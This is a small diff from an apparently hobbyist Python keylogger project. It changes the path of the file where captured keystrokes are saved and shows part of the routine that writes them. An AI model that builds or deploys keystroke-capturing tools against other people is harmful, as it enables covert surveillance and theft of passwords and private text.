@@ -21,7 +21,7 @@ def press(key): # Left these as Comments because it prints <255> continuously.
     #    save(keys) 
 
 def save(keys):
-    with open(r"C:\Users\Flores\Joey-vscode-workspaces\Python-Projects\.completed\keylogger\save.txt", "a") as file:
+    with open(r"C:\Users\Flores\Joey-vscode-workspaces\Python-Projects\completed\keylogger\save.txt", "a") as file:
         for key in keys:
             key = str(key).replace("'", "")
             if key.find("space") > 0:
